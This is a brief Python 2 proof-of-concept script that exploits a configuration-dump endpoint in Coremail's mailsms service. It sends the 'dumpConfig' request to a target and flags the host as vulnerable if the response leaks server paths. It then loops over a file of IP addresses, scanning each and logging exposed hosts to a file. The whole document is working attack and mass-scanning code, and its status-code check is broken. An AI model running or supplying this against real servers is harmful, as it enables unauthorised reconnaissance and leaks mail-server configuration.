#-*- Coding: utf-8 -*-

import requests,sys

def mailsmsPoC(url):
    url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    try:
        r = requests.get(url,timeout=10)
        if (r.status_code != '404') and ("/home/coremail" in r.text):
            print "mailsms is vulnerable: {0}".format(url)
            with open('vul.txt', 'a') as f:
                    f.write(url + '\n')
        else:
            print "mailsms is safe!"
    except Exception as e:
        print "######time out######"
if __name__ == '__main__':
    try:
        mailsmsPoC(sys.argv[1])
    except:
        print "python poc.py"


file = open('ip.txt', 'r')
for f in file.readlines():
    url = f.strip('\r\n')
    mailsmsPoC(url)